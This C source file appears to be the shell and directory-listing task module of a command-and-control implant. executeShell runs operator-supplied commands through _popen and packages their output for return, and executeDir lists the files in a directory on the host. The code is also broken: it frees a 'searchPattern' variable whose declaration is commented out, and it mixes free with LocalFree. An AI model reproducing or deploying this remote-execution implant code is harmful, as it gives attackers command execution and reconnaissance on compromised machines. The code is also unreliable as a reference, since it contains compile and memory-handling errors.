#include "Shell.h"

PPackage executeShell(PParser arguments)
{
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PCHAR cmd = getString(arguments, &size); // will read first UINT32 as size of param
	cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!cmd)
	{
		_err("[SHELL] Error in executeShell command");
		return NULL;
	}

	FILE* fp;
	CHAR path[1035];
	PPackage output = newPackage(0, FALSE);

	fp = _popen(cmd, "rb");
	if (!fp)
	{
		_err("[SHELL] Error in executeShell command");

		// Cleanup memory
		freePackage(output);
		LocalFree(cmd);

		return NULL;
	}
	while (fgets(path, sizeof(path), fp) != nullptr)
	{
		addString(output, path, FALSE);
	}

	_pclose(fp);
	LocalFree(cmd);

	return output;

}

PPackage executeDir(PParser arguments)
{
	TCHAR szDir[MAX_PATH];
	UINT32 nbArg = getInt32(arguments);
	SIZE_T size = 0;
	PCHAR path = getString(arguments, &size); // will read first UINT32 as size of param
	path = (PCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
	if (!path)
	{
		_err("[DIR] Error in executeDir command");
		return NULL;
	}

	PPackage output = newPackage(0, FALSE);

	// Create search pattern with wilcard (all files in dir)
	// PCHAR searchPattern = (PCHAR)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH + 2) * sizeof(CHAR));
	// snprintf(searchPattern, MAX_PATH + 2, "%s\\*", path);
	//
	StringCchCopy(szDir, MAX_PATH, path);
  StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(szDir, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		_err("[DIR] Error in executeDir command");
		freePackage(output);
		free(searchPattern);
		free(path);
		return NULL;
	}
	do
	{
		addString(output, FindFileData.cFileName, FALSE);
	} while (FindNextFile(hFind, &FindFileData) != 0);

	FindClose(hFind);
	LocalFree(searchPattern);
	LocalFree(path);
	return output;
}
